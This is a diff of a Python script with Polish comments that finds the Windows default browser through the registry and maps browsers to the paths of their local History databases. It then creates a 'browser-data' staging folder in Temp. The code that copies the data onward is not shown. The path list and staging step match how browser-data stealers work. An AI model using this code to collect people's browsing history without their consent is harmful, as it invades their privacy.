@@ -15,50 +15,53 @@ user = getpass.getuser()
 
 temp = f"C:/Users/{user}/AppData/Local/Temp/"
 browser={
-    "Google Chrome":f"C:/Users/{user}/AppData/Local/Google/Chrome/User Data/Default/History",
-    "MSEdge":f"C:/Users/{user}/AppData/Local/Microsoft/Edge/User Data/Default/History",
-    "Microsoft Edge":f"C:/Users/{user}/AppData/Local/Microsoft/Edge/User Data/Default/History",
-    "Opera Stable":f"C:/Users/{user}/AppData/Roaming/Opera Software/Opera Stable/History",
-    "Opera GX":f"C:/Users/{user}/AppData/Roaming/Opera Software/Opera GX Stable/History",
-    "Vivaldi":f"C:/Users/{user}/AppData/Local/Vivaldi/User Data/Default/History",
-    "Brave":f"C:/Users/{user}/AppData/Local/BraveSoftware/Brave-Browser/User Data/Default/History",
-    "CentBrowser":f"C:/Users/{user}/AppData/Local/CentBrowser/User Data/Default/History",
-    "Iron":f"C:/Users/{user}/AppData/Local/Chromium/User Data/Default/History",
-    "Colibri":f"C:/Users/{user}/AppData/Roaming/Colibri/History",
-    "Chromium":f"C:/Users/{user}/AppData/Local/Chromium/User Data/Default/History"
-}
+    "chrome.exe": f"C:/Users/{user}/AppData/Local/Google/Chrome/User Data/Default/History",
+    "msedge.exe": f"C:/Users/{user}/AppData/Local/Microsoft/Edge/User Data/Default/History",
+    "opera.exe": f"C:/Users/{user}/AppData/Roaming/Opera Software/Opera Stable/History",
+    "launcher.exe": f"C:/Users/{user}/AppData/Roaming/Opera Software/Opera Stable/History", # Opera czasem używa launcher.exe
+    "brave.exe": f"C:/Users/{user}/AppData/Local/BraveSoftware/Brave-Browser/User Data/Default/History",
+    "vivaldi.exe": f"C:/Users/{user}/AppData/Local/Vivaldi/User Data/Default/History",
+    "centbrowser.exe": f"C:/Users/{user}/AppData/Local/CentBrowser/User Data/Default/History",
+    "chromium.exe": f"C:/Users/{user}/AppData/Local/Chromium/User Data/Default/History",
+    "colibri.exe": f"C:/Users/{user}/AppData/Roaming/Colibri/History"}
 
-def get_browser_name():
-    default_browser_path = r"Software\Microsoft\Windows\Shell\Associations\UrlAssociations\http\UserChoice"
-
+def get_browser_exe_name():
+    """Odczytuje rejestr i zwraca wyłącznie nazwę pliku wykonywalnego z rozszerzeniem .exe"""
+    user_choice_key = r"Software\Microsoft\Windows\Shell\Associations\UrlAssociations\http\UserChoice"
+    
     try:
-        # Pobieramy identyfikator z rejestru
-        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, default_browser_path) as key:
-            # POPRAWKA: "ProgId" zamiast "PrologId"
+        # 1. Pobierz identyfikator ProgId aktualnej domyślnej przeglądarki
+        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, user_choice_key) as key:
             prog_id, _ = winreg.QueryValueEx(key, "ProgId")
-        
-        # Próba 1: Pobranie oficjalnej nazwy aplikacji
-        try: 
-            with winreg.OpenKey(winreg.HKEY_CLASSES_ROOT, rf"{prog_id}\Application") as key:
-                return winreg.QueryValueEx(key, "ApplicationName")[0]
-        except FileNotFoundError:
-            pass
 
-        # Próba 2: Pobranie nazwy z komendy uruchomieniowej (.exe)
+        # 2. Pobierz pełną komendę systemową zapisaną dla tego ProgId
+        command_key = rf"{prog_id}\shell\open\command"
+        with winreg.OpenKey(winreg.HKEY_CLASSES_ROOT, command_key) as key:
+            command, _ = winreg.QueryValueEx(key, "")
+
+        # 3. Wyciągnij surową ścieżkę do pliku (usuwając cudzysłowy)
+        if '"' in command:
+            full_path = command.split('"')[1]
+        else:
+            full_path = command.split()[0]
+
+        # 4. Wyciągnij samą nazwę pliku z rozszerzeniem .exe i zamień na małe litery
+        exe_name = os.path.basename(full_path).lower()
+        return exe_name
+
+    except Exception:
+        # Rejestr awaryjny (globalny), jeśli klucz użytkownika nie odpowiada
         try:
-            with winreg.OpenKey(winreg.HKEY_CLASSES_ROOT, rf"{prog_id}\shell\open\command") as key:
+            with winreg.OpenKey(winreg.HKEY_CLASSES_ROOT, r"http\shell\open\command") as key:
                 command, _ = winreg.QueryValueEx(key, "")
-                exe_path = command.split('"')[1] if '"' in command else command.split()[0]
-                browser_name = os.path.basename(exe_path).replace(".exe", "").capitalize()
-                return browser_name
-        except Exception:
-            return prog_id
-            
-    except Exception as e:
-        return f"error {e}"
+                full_path = command.split('"')[1] if '"' in command else command.split()[0]
+                return os.path.basename(full_path).lower()
+        except:
+            return "brave.exe"
+    
 # dostać się do histori
 
-path = browser[get_browser_name()]
+path = browser[get_browser_exe_name()]
 
 os.makedirs(temp+"browser-data/",exist_ok=True)
 
